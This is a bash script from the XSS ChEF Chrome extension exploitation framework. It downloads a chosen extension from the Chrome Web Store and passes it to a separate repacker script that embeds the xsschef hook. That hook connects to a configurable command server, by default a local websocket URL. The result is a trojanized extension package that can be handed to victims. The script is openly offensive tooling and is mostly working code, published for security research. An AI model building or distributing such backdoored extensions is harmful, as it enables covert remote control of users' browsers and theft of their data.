#!/usr/bin/env bash
#   XSS ChEF - Chrome Extension Exploitation framework
#    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Usage:
# ./repacker-webstore.sh [-q] [-u xsschef-server-url ] <extension-id> <output.crx>
#
# using getopts
#
# Will download extension from Google Chrome Webstore and replace
# the .crx file with a version with xsschef embedded.
RUNDIR=`pwd`
DIR=$( cd "$( dirname "$0" )" && pwd )
tempfoo=`basename $0`
TMPDIR=`mktemp -d -t ${tempfoo}` || exit 1

function help {
    printf "Usage: %s: [-q] [-u server_url] <extension_id> <output.crx> \n" $(basename $0) >&2
    echo "         -q quiet, only repacked extension filename will be printed to stdout" >&2
    echo "         -u xsschef server URL e.g. ws://localhost:8080/chef" >&2
    exit 2
}

function cleanup {
    rm -rf "$TMPDIR"
    cd "$RUNDIR"
}

function bailout () {
    echo "Error: $1" >&2
    cleanup
    exit 1
}


#Parsing command line parameters
QUIET=
SERVER_URL="ws://localhost:8080/chef"

while getopts 'qu:' OPTION
do
    case $OPTION in
    q)  QUIET="1"
        ;;
    u)  SERVER_URL="$OPTARG"
        ;;
    ?)  help
    ;;
    esac
done
shift $(($OPTIND - 1))

EXT_ID="$1"
OUTPUT_CRX="$2"

if [ ! "$EXT_ID" -o ! "$OUTPUT_CRX" ]; then
    help
fi

WEBSTORE_URL="https://clients2.google.com/service/update2/crx?response=redirect&x=id%3D${EXT_ID}%26lang%3Dpl%26uc"

# offline test
# cp tmp/adblock.crx "$TMPDIR/org.crx"

if [ "$QUIET" ]; then
    curl -L "$WEBSTORE_URL" -o "$TMPDIR/org.crx" --silent
else
    curl -L "$WEBSTORE_URL" -o "$TMPDIR/org.crx"
fi

if (( $? )) ; then 
    bailout "CURL failed."
fi

if [ "$QUIET" ]; then
    $DIR/repacker.sh "$TMPDIR/org.crx" "$OUTPUT_CRX" "$SERVER_URL" repack  >/dev/null || bailout "Repacker failed"
    echo -n $OUTPUT_CRX
else
    $DIR/repacker.sh "$TMPDIR/org.crx" "$OUTPUT_CRX" "$SERVER_URL" repack || bailout "Repacker failed"
fi
rm $TMPDIR/org.crx